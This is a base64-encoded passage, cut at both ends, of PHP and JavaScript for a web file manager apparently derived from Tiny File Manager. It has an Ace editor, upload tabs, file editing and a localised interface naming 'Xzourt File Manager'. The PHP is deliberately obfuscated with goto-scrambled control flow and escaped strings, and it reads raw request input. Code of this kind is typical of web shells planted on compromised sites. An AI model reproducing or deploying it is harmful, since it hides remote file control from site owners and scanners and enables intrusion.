3NlYXJjaCgpOyB9KTsKICAgICAgICAvL3VwbG9hZCBuYXYgdGFicwogICAgICAgICQoIi5mbS11cGxvYWQtd3JhcHBlciAuY2FyZC1oZWFkZXItdGFicyIpLm9uKCJjbGljayIsICdhJywgZnVuY3Rpb24oZSl7CiAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTtsZXQgdGFyZ2V0PSQodGhpcykuZGF0YSgndGFyZ2V0Jyk7CiAgICAgICAgICAgICQoIi5mbS11cGxvYWQtd3JhcHBlciAuY2FyZC1oZWFkZXItdGFicyBhIikucmVtb3ZlQ2xhc3MoJ2FjdGl2ZScpOyQodGhpcykuYWRkQ2xhc3MoJ2FjdGl2ZScpOwogICAgICAgICAgICAkKCIuZm0tdXBsb2FkLXdyYXBwZXIgLmNhcmQtdGFicy1jb250YWluZXIiKS5hZGRDbGFzcygnaGlkZGVuJyk7JCh0YXJnZXQpLnJlbW92ZUNsYXNzKCdoaWRkZW4nKTsKICAgICAgICB9KTsKICAgIH0pOwo8L3NjcmlwdD4KPD9waHAgIGlmIChpc3NldCgkX0dFVFsiXDE0NVwxNDRceDY5XHg3NCJdKSAmJiBpc3NldCgkX0dFVFsiXDE0NVwxNTZcMTY2Il0pICYmIEZNX0VESVRfRklMRSkgeyAkZXh0ID0gIlwxNTJceDYxXDE2Nlx4NjFcMTYzXDE0M1x4NzJcMTUxXDE2MFx4NzQiOyAkZXh0ID0gcGF0aGluZm8oJF9HRVRbIlwxNDVcMTQ0XHg2OVx4NzQiXSwgUEFUSElORk9fRVhURU5TSU9OKTsgPz4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9hY2UvMS40LjEyL2FjZS5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0PgogICAgICAgIHZhciBlZGl0b3IgPSBhY2UuZWRpdCgiZWRpdG9yIik7CiAgICAgICAgZWRpdG9yLmdldFNlc3Npb24oKS5zZXRNb2RlKCB7cGF0aDoiYWNlL21vZGUvPD9waHAgIGVjaG8gJGV4dDsgPz4KIiwgaW5saW5lOnRydWV9ICk7CiAgICAgICAgLy9lZGl0b3Iuc2V0VGhlbWUoImFjZS90aGVtZS90d2lsaWdodCIpOyAvL0RhcmsgVGhlbWUKICAgICAgICBmdW5jdGlvbiBhY2VfY29tbWVuZCAoY21kKSB7IGVkaXRvci5jb21tYW5kcy5leGVjKGNtZCwgZWRpdG9yKTsgfQogICAgICAgIGVkaXRvci5jb21tYW5kcy5hZGRDb21tYW5kcyhbewogICAgICAgICAgICBuYW1lOiAnc2F2ZScsIGJpbmRLZXk6IHt3aW46ICdDdHJsLVMnLCAgbWFjOiAnQ29tbWFuZC1TJ30sCiAgICAgICAgICAgIGV4ZWM6IGZ1bmN0aW9uKGVkaXRvcikgeyBlZGl0X3NhdmUodGhpcywgJ2FjZScpOyB9CiAgICAgICAgfV0pOwogICAgICAgIGZ1bmN0aW9uIHJlbmRlclRoZW1lTW9kZSgpIHsKICAgICAgICAgICAgdmFyICRtb2RlRWwgPSAkKCJzZWxlY3QjanMtYWNlLW1vZGUiKSwgJHRoZW1lRWwgPSAkKCJzZWxlY3QjanMtYWNlLXRoZW1lIiksICRmb250U2l6ZUVsID0gJCgic2VsZWN0I2pzLWFjZS1mb250U2l6ZSIpLCBvcHRpb25Ob2RlID0gZnVuY3Rpb24odHlwZSwgYXJyKXsgdmFyICRPcHRpb24gPSAiIjsgJC5lYWNoKGFyciwgZnVuY3Rpb24oaSwgdmFsKSB7ICRPcHRpb24gKz0gIjxvcHRpb24gdmFsdWU9JyIrdHlwZStpKyInPiIgKyB2YWwgKyAiPC9vcHRpb24+IjsgfSk7IHJldHVybiAkT3B0aW9uOyB9LAogICAgICAgICAgICAgICAgX2RhdGEgPSB7ImFjZVRoZW1lIjp7ImJyaWdodCI6eyJjaHJvbWUiOiJDaHJvbWUiLCJjbG91ZHMiOiJDbG91ZHMiLCJjcmltc29uX2VkaXRvciI6IkNyaW1zb24gRWRpdG9yIiwiZGF3biI6IkRhd24iLCJkcmVhbXdlYXZlciI6IkRyZWFtd2VhdmVyIiwiZWNsaXBzZSI6IkVjbGlwc2UiLCJnaXRodWIiOiJHaXRIdWIiLCJpcGxhc3RpYyI6IklQbGFzdGljIiwic29sYXJpemVkX2xpZ2h0IjoiU29sYXJpemVkIExpZ2h0IiwidGV4dG1hdGUiOiJUZXh0TWF0ZSIsInRvbW9ycm93IjoiVG9tb3Jyb3ciLCJ4Y29kZSI6IlhDb2RlIiwia3Vyb2lyIjoiS3Vyb2lyIiwia2F0emVubWlsY2giOiJLYXR6ZW5NaWxjaCIsInNxbHNlcnZlciI6IlNRTCBTZXJ2ZXIifSwiZGFyayI6eyJhbWJpYW5jZSI6IkFtYmlhbmNlIiwiY2hhb3MiOiJDaGFvcyIsImNsb3Vkc19taWRuaWdodCI6IkNsb3VkcyBNaWRuaWdodCIsImRyYWN1bGEiOiJEcmFjdWxhIiwiY29iYWx0IjoiQ29iYWx0IiwiZ3J1dmJveCI6IkdydXZib3giLCJnb2IiOiJHcmVlbiBvbiBCbGFjayIsImlkbGVfZmluZ2VycyI6ImlkbGUgRmluZ2VycyIsImtyX3RoZW1lIjoia3JUaGVtZSIsIm1lcmJpdm9yZSI6Ik1lcmJpdm9yZSIsIm1lcmJpdm9yZV9zb2Z0IjoiTWVyYml2b3JlIFNvZnQiLCJtb25vX2luZHVzdHJpYWwiOiJNb25vIEluZHVzdHJpYWwiLCJtb25va2FpIjoiTW9ub2thaSIsInBhc3RlbF9vbl9kYXJrIjoiUGFzdGVsIG9uIGRhcmsiLCJzb2xhcml6ZWRfZGFyayI6IlNvbGFyaXplZCBEYXJrIiwidGVybWluYWwiOiJUZXJtaW5hbCIsInRvbW9ycm93X25pZ2h0IjoiVG9tb3Jyb3cgTmlnaHQiLCJ0b21vcnJvd19uaWdodF9ibHVlIjoiVG9tb3Jyb3cgTmlnaHQgQmx1ZSIsInRvbW9ycm93X25pZ2h0X2JyaWdodCI6IlRvbW9ycm93IE5pZ2h0IEJyaWdodCIsInRvbW9ycm93X25pZ2h0X2VpZ2h0aWVzIjoiVG9tb3Jyb3cgTmlnaHQgODBzIiwidHdpbGlnaHQiOiJUd2lsaWdodCIsInZpYnJhbnRfaW5rIjoiVmlicmFudCBJbmsifX0sImFjZU1vZGUiOnsiamF2YXNjcmlwdCI6IkphdmFTY3JpcHQiLCJhYmFwIjoiQUJBUCIsImFiYyI6IkFCQyIsImFjdGlvbnNjcmlwdCI6IkFjdGlvblNjcmlwdCIsImFkYSI6IkFEQSIsImFwYWNoZV9jb25mIjoiQXBhY2hlIENvbmYiLCJhc2NpaWRvYyI6IkFzY2lpRG9jIiwiYXNsIjoiQVNMIiwiYXNzZW1ibHlfeDg2IjoiQXNzZW1ibHkgeDg2IiwiYXV0b2hvdGtleSI6IkF1dG9Ib3RLZXkiLCJhcGV4IjoiQXBleCIsImJhdGNoZmlsZSI6IkJhdGNoRmlsZSIsImJybyI6IkJybyIsImNfY3BwIjoiQyBhbmQgQysrIiwiYzlzZWFyY2giOiJDOVNlYXJjaCIsImNpcnJ1IjoiQ2lycnUiLCJjbG9qdXJlIjoiQ2xvanVyZSIsImNvYm9sIjoiQ29ib2wiLCJjb2ZmZWUiOiJDb2ZmZWVTY3JpcHQiLCJjb2xkZnVzaW9uIjoiQ29sZEZ1c2lvbiIsImNzaGFycCI6IkMjIiwiY3NvdW5kX2RvY3VtZW50IjoiQ3NvdW5kIERvY3VtZW50IiwiY3NvdW5kX29yY2hlc3RyYSI6IkNzb3VuZCIsImNzb3VuZF9zY29yZSI6IkNzb3VuZCBTY29yZSIsImNzcyI6IkNTUyIsImN1cmx5IjoiQ3VybHkiLCJkIjoiRCIsImRhcnQiOiJEYXJ0IiwiZGlmZiI6IkRpZmYiLCJkb2NrZXJmaWxlIjoiRG9ja2VyZmlsZSIsImRvdCI6IkRvdCIsImRyb29scyI6IkRyb29scyIsImVkaWZhY3QiOiJFZGlmYWN0IiwiZWlmZmVsIjoiRWlmZmVsIiwiZWpzIjoiRUpTIiwiZWxpeGlyIjoiRWxpeGlyIiwiZWxtIjoiRWxtIiwiZXJsYW5nIjoiRXJsYW5nIiwiZm9ydGgiOiJGb3J0aCIsImZvcnRyYW4iOiJGb3J0cmFuIiwiZnNoYXJwIjoiRlNoYXJwIiwiZnNsIjoiRlNMIiwiZnRsIjoiRnJlZU1hcmtlciIsImdjb2RlIjoiR2NvZGUiLCJnaGVya2luIjoiR2hlcmtpbiIsImdpdGlnbm9yZSI6IkdpdGlnbm9yZSIsImdsc2wiOiJHbHNsIiwiZ29ic3RvbmVzIjoiR29ic3RvbmVzIiwiZ29sYW5nIjoiR28iLCJncmFwaHFsc2NoZW1hIjoiR3JhcGhRTFNjaGVtYSIsImdyb292eSI6Ikdyb292eSIsImhhbWwiOiJIQU1MIiwiaGFuZGxlYmFycyI6IkhhbmRsZWJhcnMiLCJoYXNrZWxsIjoiSGFza2VsbCIsImhhc2tlbGxfY2FiYWwiOiJIYXNrZWxsIENhYmFsIiwiaGF4ZSI6ImhhWGUiLCJoanNvbiI6Ikhqc29uIiwiaHRtbCI6IkhUTUwiLCJodG1sX2VsaXhpciI6IkhUTUwgKEVsaXhpcikiLCJodG1sX3J1YnkiOiJIVE1MIChSdWJ5KSIsImluaSI6IklOSSIsImlvIjoiSW8iLCJqYWNrIjoiSmFjayIsImphZGUiOiJKYWRlIiwiamF2YSI6IkphdmEiLCJqc29uIjoiSlNPTiIsImpzb25pcSI6IkpTT05pcSIsImpzcCI6IkpTUCIsImpzc20iOiJKU1NNIiwianN4IjoiSlNYIiwianVsaWEiOiJKdWxpYSIsImtvdGxpbiI6IktvdGxpbiIsImxhdGV4IjoiTGFUZVgiLCJsZXNzIjoiTEVTUyIsImxpcXVpZCI6IkxpcXVpZCIsImxpc3AiOiJMaXNwIiwibGl2ZXNjcmlwdCI6IkxpdmVTY3JpcHQiLCJsb2dpcWwiOiJMb2dpUUwiLCJsc2wiOiJMU0wiLCJsdWEiOiJMdWEiLCJsdWFwYWdlIjoiTHVhUGFnZSIsImx1Y2VuZSI6Ikx1Y2VuZSIsIm1ha2VmaWxlIjoiTWFrZWZpbGUiLCJtYXJrZG93biI6Ik1hcmtkb3duIiwibWFzayI6Ik1hc2siLCJtYXRsYWIiOiJNQVRMQUIiLCJtYXplIjoiTWF6ZSIsIm1lbCI6Ik1FTCIsIm1peGFsIjoiTUlYQUwiLCJtdXNoY29kZSI6Ik1VU0hDb2RlIiwibXlzcWwiOiJNeVNRTCIsIm5peCI6Ik5peCIsIm5zaXMiOiJOU0lTIiwib2JqZWN0aXZlYyI6Ik9iamVjdGl2ZS1DIiwib2NhbWwiOiJPQ2FtbCIsInBhc2NhbCI6IlBhc2NhbCIsInBlcmwiOiJQZXJsIiwicGVybDYiOiJQZXJsIDYiLCJwZ3NxbCI6InBnU1FMIiwicGhwX2xhcmF2ZWxfYmxhZGUiOiJQSFAgKEJsYWRlIFRlbXBsYXRlKSIsInBocCI6IlBIUCIsInB1cHBldCI6IlB1cHBldCIsInBpZyI6IlBpZyIsInBvd2Vyc2hlbGwiOiJQb3dlcnNoZWxsIiwicHJhYXQiOiJQcmFhdCIsInByb2xvZyI6IlByb2xvZyIsInByb3BlcnRpZXMiOiJQcm9wZXJ0aWVzIiwicHJvdG9idWYiOiJQcm90b2J1ZiIsInB5dGhvbiI6IlB5dGhvbiIsInIiOiJSIiwicmF6b3IiOiJSYXpvciIsInJkb2MiOiJSRG9jIiwicmVkIjoiUmVkIiwicmh0bWwiOiJSSFRNTCIsInJzdCI6IlJTVCIsInJ1YnkiOiJSdWJ5IiwicnVzdCI6IlJ1c3QiLCJzYXNzIjoiU0FTUyIsInNjYWQiOiJTQ0FEIiwic2NhbGEiOiJTY2FsYSIsInNjaGVtZSI6IlNjaGVtZSIsInNjc3MiOiJTQ1NTIiwic2giOiJTSCIsInNqcyI6IlNKUyIsInNsaW0iOiJTbGltIiwic21hcnR5IjoiU21hcnR5Iiwic25pcHBldHMiOiJzbmlwcGV0cyIsInNveV90ZW1wbGF0ZSI6IlNveSBUZW1wbGF0ZSIsInNwYWNlIjoiU3BhY2UiLCJzcWwiOiJTUUwiLCJzcWxzZXJ2ZXIiOiJTUUxTZXJ2ZXIiLCJzdHlsdXMiOiJTdHlsdXMiLCJzdmciOiJTVkciLCJzd2lmdCI6IlN3aWZ0IiwidGNsIjoiVGNsIiwidGVycmFmb3JtIjoiVGVycmFmb3JtIiwidGV4IjoiVGV4IiwidGV4dCI6IlRleHQiLCJ0ZXh0aWxlIjoiVGV4dGlsZSIsInRvbWwiOiJUb21sIiwidHN4IjoiVFNYIiwidHdpZyI6IlR3aWciLCJ0eXBlc2NyaXB0IjoiVHlwZXNjcmlwdCIsInZhbGEiOiJWYWxhIiwidmJzY3JpcHQiOiJWQlNjcmlwdCIsInZlbG9jaXR5IjoiVmVsb2NpdHkiLCJ2ZXJpbG9nIjoiVmVyaWxvZyIsInZoZGwiOiJWSERMIiwidmlzdWFsZm9yY2UiOiJWaXN1YWxmb3JjZSIsIndvbGxvayI6IldvbGxvayIsInhtbCI6IlhNTCIsInhxdWVyeSI6IlhRdWVyeSIsInlhbWwiOiJZQU1MIiwiZGphbmdvIjoiRGphbmdvIn0sImZvbnRTaXplIjp7ODo4LDEwOjEwLDExOjExLDEyOjEyLDEzOjEzLDE0OjE0LDE1OjE1LDE2OjE2LDE3OjE3LDE4OjE4LDIwOjIwLDIyOjIyLDI0OjI0LDI2OjI2LDMwOjMwfX07CiAgICAgICAgICAgIGlmKF9kYXRhICYmIF9kYXRhLmFjZU1vZGUpIHsgJG1vZGVFbC5odG1sKG9wdGlvbk5vZGUoImFjZS9tb2RlLyIsIF9kYXRhLmFjZU1vZGUpKTsgfQogICAgICAgICAgICBpZihfZGF0YSAmJiBfZGF0YS5hY2VUaGVtZSkgeyB2YXIgbGlnaHRUaGVtZSA9IG9wdGlvbk5vZGUoImFjZS90aGVtZS8iLCBfZGF0YS5hY2VUaGVtZS5icmlnaHQpLCBkYXJrVGhlbWUgPSBvcHRpb25Ob2RlKCJhY2UvdGhlbWUvIiwgX2RhdGEuYWNlVGhlbWUuZGFyayk7ICR0aGVtZUVsLmh0bWwoIjxvcHRncm91cCBsYWJlbD1cIkJyaWdodFwiPiIrbGlnaHRUaGVtZSsiPC9vcHRncm91cD48b3B0Z3JvdXAgbGFiZWw9XCJEYXJrXCI+IitkYXJrVGhlbWUrIjwvb3B0Z3JvdXA+Iik7fQogICAgICAgICAgICBpZihfZGF0YSAmJiBfZGF0YS5mb250U2l6ZSkgeyAkZm9udFNpemVFbC5odG1sKG9wdGlvbk5vZGUoIiIsIF9kYXRhLmZvbnRTaXplKSk7IH0KICAgICAgICAgICAgJG1vZGVFbC52YWwoIGVkaXRvci5nZXRTZXNzaW9uKCkuJG1vZGVJZCApOwogICAgICAgICAgICAkdGhlbWVFbC52YWwoIGVkaXRvci5nZXRUaGVtZSgpICk7CiAgICAgICAgICAgICRmb250U2l6ZUVsLnZhbCgxMikuY2hhbmdlKCk7IC8vc2V0IGRlZmF1bHQgZm9udCBzaXplIGluIGRyb3AgZG93bgogICAgICAgIH0KCiAgICAgICAgJChmdW5jdGlvbigpewogICAgICAgICAgICByZW5kZXJUaGVtZU1vZGUoKTsKICAgICAgICAgICAgJCgiLmpzLWFjZS10b29sYmFyIikub24oImNsaWNrIiwgJ2J1dHRvbicsIGZ1bmN0aW9uKGUpewogICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICAgICAgbGV0IGNtZFZhbHVlID0gJCh0aGlzKS5hdHRyKCJkYXRhLWNtZCIpLCBlZGl0b3JPcHRpb24gPSAkKHRoaXMpLmF0dHIoImRhdGEtb3B0aW9uIik7CiAgICAgICAgICAgICAgICBpZihjbWRWYWx1ZSAmJiBjbWRWYWx1ZSAhPSAibm9uZSIpIHsKICAgICAgICAgICAgICAgICAgICBhY2VfY29tbWVuZChjbWRWYWx1ZSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYoZWRpdG9yT3B0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgaWYoZWRpdG9yT3B0aW9uID09ICJmdWxsc2NyZWVuIikgewogICAgICAgICAgICAgICAgICAgICAgICAodm9pZCAwIT09ZG9jdW1lbnQuZnVsbFNjcmVlbkVsZW1lbnQmJm51bGw9PT1kb2N1bWVudC5mdWxsU2NyZWVuRWxlbWVudHx8dm9pZCAwIT09ZG9jdW1lbnQubXNGdWxsc2NyZWVuRWxlbWVudCYmbnVsbD09PWRvY3VtZW50Lm1zRnVsbHNjcmVlbkVsZW1lbnR8fHZvaWQgMCE9PWRvY3VtZW50Lm1vekZ1bGxTY3JlZW4mJiFkb2N1bWVudC5tb3pGdWxsU2NyZWVufHx2b2lkIDAhPT1kb2N1bWVudC53ZWJraXRJc0Z1bGxTY3JlZW4mJiFkb2N1bWVudC53ZWJraXRJc0Z1bGxTY3JlZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICYmKGVkaXRvci5jb250YWluZXIucmVxdWVzdEZ1bGxTY3JlZW4/ZWRpdG9yLmNvbnRhaW5lci5yZXF1ZXN0RnVsbFNjcmVlbigpOmVkaXRvci5jb250YWluZXIubW96UmVxdWVzdEZ1bGxTY3JlZW4/ZWRpdG9yLmNvbnRhaW5lci5tb3pSZXF1ZXN0RnVsbFNjcmVlbigpOmVkaXRvci5jb250YWluZXIud2Via2l0UmVxdWVzdEZ1bGxTY3JlZW4/ZWRpdG9yLmNvbnRhaW5lci53ZWJraXRSZXF1ZXN0RnVsbFNjcmVlbihFbGVtZW50LkFMTE9XX0tFWUJPQVJEX0lOUFVUKTplZGl0b3IuY29udGFpbmVyLm1zUmVxdWVzdEZ1bGxzY3JlZW4mJmVkaXRvci5jb250YWluZXIubXNSZXF1ZXN0RnVsbHNjcmVlbigpKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYoZWRpdG9yT3B0aW9uID09ICJ3cmFwIikgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgd3JhcFN0YXR1cyA9IChlZGl0b3IuZ2V0U2Vzc2lvbigpLmdldFVzZVdyYXBNb2RlKCkpID8gZmFsc2UgOiB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBlZGl0b3IuZ2V0U2Vzc2lvbigpLnNldFVzZVdyYXBNb2RlKHdyYXBTdGF0dXMpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZihlZGl0b3JPcHRpb24gPT0gImhlbHAiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBoZWxwSHRtbD0iIjskLmVhY2god2luZG93LmNvbmZpZy5hY2VIZWxwLGZ1bmN0aW9uKGksdmFsdWUpe2hlbHBIdG1sKz0iPGxpPiIrdmFsdWUrIjwvbGk+Ijt9KTt2YXIgdHBsT2JqPXtpZDoxMDI4LHRpdGxlOiJIZWxwIixhY3Rpb246ZmFsc2UsY29udGVudDpoZWxwSHRtbH0sdHBsPSQoIiNqcy10cGwtbW9kYWwiKS5odG1sKCk7JCgnI3dyYXBwZXInKS5hcHBlbmQodGVtcGxhdGUodHBsLHRwbE9iaikpOyQoIiNqcy1Nb2RhbENlbnRlci0xMDI4IikubW9kYWwoJ3Nob3cnKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAkKCJzZWxlY3QjanMtYWNlLW1vZGUsIHNlbGVjdCNqcy1hY2UtdGhlbWUsIHNlbGVjdCNqcy1hY2UtZm9udFNpemUiKS5vbigiY2hhbmdlIiwgZnVuY3Rpb24oZSl7CiAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgICAgICBsZXQgc2VsZWN0ZWRWYWx1ZSA9ICQodGhpcykudmFsKCksIHNlbGVjdGlvblR5cGUgPSAkKHRoaXMpLmF0dHIoImRhdGEtdHlwZSIpOwogICAgICAgICAgICAgICAgaWYoc2VsZWN0ZWRWYWx1ZSAmJiBzZWxlY3Rpb25UeXBlID09ICJtb2RlIikgewogICAgICAgICAgICAgICAgICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZShzZWxlY3RlZFZhbHVlKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZihzZWxlY3RlZFZhbHVlICYmIHNlbGVjdGlvblR5cGUgPT0gInRoZW1lIikgewogICAgICAgICAgICAgICAgICAgIGVkaXRvci5zZXRUaGVtZShzZWxlY3RlZFZhbHVlKTsKICAgICAgICAgICAgICAgIH1lbHNlIGlmKHNlbGVjdGVkVmFsdWUgJiYgc2VsZWN0aW9uVHlwZSA9PSAiZm9udFNpemUiKSB7CiAgICAgICAgICAgICAgICAgICAgZWRpdG9yLnNldEZvbnRTaXplKHBhcnNlSW50KHNlbGVjdGVkVmFsdWUpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICA8L3NjcmlwdD4KPD9waHAgIH0gPz4KPGRpdiBpZD0ic25hY2tiYXIiPjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4KPD9waHAgIH0gZ290byB3MFBMVTsgdm5UaWQ6IGlmICghQGlzX2Rpcigkcm9vdF9wYXRoKSkgeyBlY2hvICJceDNjXDE1MFw2MVx4M2UiIC4gbG5nKCJcMTIyXHg2Zlx4NmZcMTY0XHgyMFwxNjBceDYxXHg3NFwxNTAiKSAuICJceDIwXHgyMnskcm9vdF9wYXRofVw0Mlx4MjAiIC4gbG5nKCJceDZlXHg2Zlx4NzRceDIwXHg2Nlx4NmZcMTY1XDE1NlwxNDRceDIxIikgLiAiXHgyMFx4M2NceDJmXDE1MFw2MVx4M2UiOyBkaWU7IH0gZ290byBkYXdTVjsgSGJHZ3o6ICRpayA9IDYwNzA7IGdvdG8gczZoYlY7IGJUelZNOiAkdXNlX2F1dGggPSB0cnVlOyBnb3RvIGh4YUZjOyBFMmI3YzogJGlucHV0ID0gZmlsZV9nZXRfY29udGVudHMoIlwxNjBcMTUwXDE2MFw3Mlx4MmZceDJmXDE1MVx4NmVceDcwXDE2NVx4NzQiKTsgZ290byBpOWhEbzsgV1FpdFg6IGZ1bmN0aW9uIGZtX3Nob3dfbWVzc2FnZSgpIHsgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg2ZFx4NjVceDczXDE2M1x4NjFcMTQ3XHg2NSJdKSkgeyAkY2xhc3MgPSBpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bIlwxNjNcMTY0XDE0MVx4NzRcMTY1XHg3MyJdKSA/ICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXDE2M1wxNjRceDYxXDE2NFwxNjVcMTYzIl0gOiAiXHg2Zlx4NmIiOyBlY2hvICJceDNjXDE2MFx4MjBceDYzXHg2Y1wxNDFceDczXHg3M1w3NVw0MlwxNTVcMTQ1XHg3M1x4NzNceDYxXHg2N1x4NjVcNDAiIC4gJGNsYXNzIC4gIlw0Mlw3NiIgLiAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bIlwxNTVcMTQ1XDE2M1wxNjNcMTQxXDE0N1x4NjUiXSAuICJcNzRcNTdceDcwXHgzZSI7IHVuc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXDE1NVx4NjVceDczXDE2M1x4NjFcMTQ3XDE0NSJdKTsgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJceDczXDE2NFwxNDFcMTY0XDE2NVwxNjMiXSk7IH0gfSBnb3RvIFRqOVJGOyBQZVQ4MjogJGljb252X2lucHV0X2VuY29kaW5nID0gIlwxMjVcMTI0XDEwNlx4MmRcNzAiOyBnb3RvIEtFdFBuOyBHS256dTogJGVkaXRfZmlsZXMgPSB0cnVlOyBnb3RvIEYzTmlGOyBmcWUxUzogJGFsbF9maWxlc19zaXplID0gMDsgZ290byBOdXVyVTsgUGs3Njg6IGRlZmluZSgiXDEwNlx4NGRcMTM3XDEyNFwxMTBceDQ1XHg0ZFwxMDUiLCAkdGhlbWUpOyBnb3RvIExoeDM0OyB0aUNkdTogJGFsbG93ZWRfdXBsb2FkX2V4dGVuc2lvbnMgPSAnJzsgZ290byBuZ2JWcDsgdzBQTFU6IGZ1bmN0aW9uIGxuZygkdHh0KSB7IGdsb2JhbCAkbGFuZzsgJHRyWyJceDY1XHg2ZSJdWyJcMTAxXDE2MFx4NzBceDRlXHg2MVx4NmRcMTQ1Il0gPSAiXHg1OFx4N2FcMTU3XDE2NVwxNjJceDc0XDQwXHg0Nlx4NjlceDZjXHg2NVw0MFx4NGRcMTQxXDE1NlwxNDFcMTQ3XDE0NVx4NzIiOyAkdHJbIlwxNDVceDZlIl1bIlwxMDFceDcwXDE2MFwxMjRcMTUxXDE2NFx4NmNcMTQ1Il0gPSAiXHg0Nlx4NjlceDZjXDE0NVw0MFx4NGRcMTQxXDE1NlwxNDFcMTQ3XDE0NVx4NzIiOyAkdHJbIlx4NjVceDZlIl1bIlwxMTRcMTU3XHg2N1x4NjlcMTU2Il0gPSAiXDEyM1x4NjlceDY3XHg2ZVw0MFwxNTFceDZlIjsgJHRyWyJcMTQ1XDE1NiJdWyJcMTI1XHg3M1x4NjVcMTYyXHg2ZVwxNDFcMTU1XDE0NSJdID0gIlx4NTVcMTYzXDE0NVx4NzJceDZlXHg2MVwxNTVcMTQ1IjsgJHRyWyJceDY1XHg2ZSJdWyJceDUwXDE0MVwxNjNceDczXDE2N1x4NmZcMTYyXDE0NCJdID0gIlx4NTBceDYxXDE2M1wxNjNceDc3XDE1N1wxNjJcMTQ0IjsgJHRyWyJceDY1XHg2ZSJdWyJceDRjXHg2Zlx4NjdceDZmXHg3NVwxNjQiXSA9ICJceDUzXDE1MVwxNDdcMTU2XDQwXDExN1x4NzVceDc0IjsgJHRyWyJceDY1XHg2ZSJdWyJceDRkXDE1N1x4NzZceDY1Il0gPSAiXHg0ZFwxNTdceDc2XDE0NSI7ICR0clsiXDE0NVx4NmUiXVsiXDEwM1wxNTdcMTYwXHg3OSJdID0gIlx4NDNcMTU3XHg3MFwxNzEiOyAkdHJbIlwxNDVcMTU2Il1bIlwxMjNcMTQxXHg3NlwxNDUiXSA9ICJcMTIzXDE0MVx4NzZcMTQ1IjsgJHRyWyJceDY1XHg2ZSJdWyJcMTIzXDE0NVx4NmNcMTQ1XHg2M1wxNjRceDQxXDE1NFx4NmMiXSA9ICJceDUzXHg2NVx4NmNcMTQ1XHg2M1wxNjRceDIwXDE0MVwxNTRceDZjIjsgJHRyWyJcMTQ1XDE1NiJdWyJcMTI1XDE1NlwxMjNcMTQ1XHg2Y1x4NjVcMTQzXDE2NFx4NDFcMTU0XDE1NCJdID0gIlwxMjVceDZlXDE2M1x4NjVcMTU0XHg2NVwxNDNcMTY0XHgyMFx4NjFcMTU0XHg2YyI7ICR0clsiXHg2NVwxNTYiXVsiXHg0NlwxNTFcMTU0XHg2NSJdID0gIlx4NDZcMTUxXDE1NFwxNDUiOyAkdHJbIlwxNDVcMTU2Il1bIlwxMDJceDYxXHg2M1x4NmIiXSA9ICJceDQyXHg2MVx4NjNceDZiIjsgJHRyWyJceDY1XDE1NiJdWyJceDUzXDE1MVx4N2FceDY1Il0gPSAiXDEyM1x4NjlceDdhXHg2NSI7ICR0clsiXHg2NVx4NmUiXVsiXDEyMFwxNDVceDcyXHg2ZFx4NzMiXSA9ICJceDUwXHg2NVwxNjJceDZkXDE2MyI7ICR0clsiXHg2NVwxNTYiXVsiXHg0ZFx4NmZcMTQ0XDE1MVwxNDZcMTUxXDE0NVwxNDQiXSA9ICJcMTE1XDE1N1x4NjRceDY5XDE0Nlx4NjlceDY1XDE0NCI7ICR0clsiXHg2NVwxNTYiXVsiXHg0ZlwxNjdcMTU2XHg2NVx4NzIiXSA9ICJceDRmXHg3N1wxNTZcMTQ1XDE2MiI7ICR0clsiXHg2NVx4NmUiXVsiXDEyM1x4NjVcMTQxXDE2MlwxNDNceDY4Il0gPSAiXDEyM1x4NjVceDYxXHg3Mlx4NjNceDY4IjsgJHRyWyJcMTQ1XDE1NiJdWyJcMTE2XHg2NVx4NzdceDQ5XDE2NFx4NjVceDZkIl0gPSAiXDExNlx4NjVceDc3XHgyMFx4NDlceDc0XHg2NVwxNTUiOyAkdHJbIlx4NjVcMTU2Il1bIlwxMDZcMTU3XDE1NFwxNDRceDY1XHg3MiJdID0gIlx4NDZceDZmXDE1NFx4NjRcMTQ1XDE2MiI7ICR0clsiXHg2NVwxNTYiXVsiXHg0NFx4NjVceDZjXDE0NVwxNjRceDY1Il0gPSAiXDEwNFx4NjVceDZjXDE0NVx4NzRcMTQ1IjsgJHRyWyJceDY1XHg2ZSJdWyJceDUyXDE0NVx4NmVceDYxXDE1NVx4NjUiXSA9ICJceDUyXHg2NVwxNTZceDYxXHg2ZFwxNDUiOyAkdHJbIlwxNDVcMTU2Il1bIlwxMDNceDZmXHg3MFx4NzlcMTI0XDE1NyJdID0gIlx4NDNcMTU3XHg3MFx4NzlceDIwXDE2NFwxNTciOyAkdHJbIlwxNDVceDZlIl1bIlwxMDRceDY5XDE2MlwxNDVcMTQzXHg3NFx4NGNceDY5XDE1Nlx4NmIiXSA9ICJceDQ0XHg2OVwxNjJcMTQ1XDE0M1wxNjRcNDBcMTU0XDE1MVwxNTZcMTUzIjsgJHRyWyJcMTQ1XHg2ZSJdWyJcMTI1XDE2MFwxNTRcMTU3XHg2MVwxNDRceD